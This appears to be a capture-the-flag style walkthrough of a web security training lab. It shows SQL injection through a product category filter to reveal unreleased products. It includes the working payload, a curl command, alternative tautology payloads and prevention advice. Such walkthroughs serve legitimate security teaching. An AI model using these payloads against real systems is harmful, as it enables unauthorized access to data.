# SQL Injection - Product Category Filter Bypass

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter. The goal is to exploit this vulnerability to display unreleased products (where `released = 0`).

**Difficulty**: Apprentice  
**Lab URL**: https://0a150006044547e6a41b8f8400a30097.web-security-academy.net/

## Vulnerability Analysis

### Original Query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The application filters products by category and only shows released products (`released = 1`). Our goal is to bypass the `released = 1` condition.

### Injection Point
The `category` parameter in the URL is vulnerable to SQL injection:
```
/filter?category=Gifts
```

## Exploitation

### Step 1: Identify the Vulnerability
When selecting a category, the URL becomes:
```
https://[lab-url]/filter?category=Gifts
```

The category value is directly inserted into the SQL query without proper sanitization.

### Step 2: Craft the Payload
To bypass the `released = 1` condition, we can use a SQL injection payload that comments out the rest of the query:

**Payload**: `Gifts' OR 1=1--`

This transforms the query to:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The `--` comments out everything after it, effectively removing the `released = 1` condition. The `OR 1=1` ensures all products are returned.

### Step 3: Execute the Attack

**Method 1: Browser**
1. Navigate to the lab URL
2. Click on any category filter
3. Modify the URL to: `/filter?category=Gifts'+OR+1=1--`
4. Press Enter

**Method 2: curl**
```bash
curl "https://[lab-url]/filter?category=Gifts'+OR+1=1--"
```

### Step 4: Verify Success
The application should now display ALL products, including unreleased ones, and the lab will be marked as solved.

## Key Concepts

1. **SQL Comments**: The `--` syntax comments out the rest of the SQL query
2. **Boolean Logic**: `OR 1=1` always evaluates to true, bypassing filters
3. **URL Encoding**: The `+` in URLs represents a space character

## Alternative Payloads

```sql
' OR '1'='1'--
' OR 1=1#
' OR 'x'='x'--
```

## Prevention

- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Apply least privilege principle for database accounts
- Use ORM frameworks that handle SQL safely

## Lab Completion
Once the payload is executed successfully, the lab will automatically detect that unreleased products are being displayed and mark the challenge as solved.

---
**Note**: This walkthrough is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.
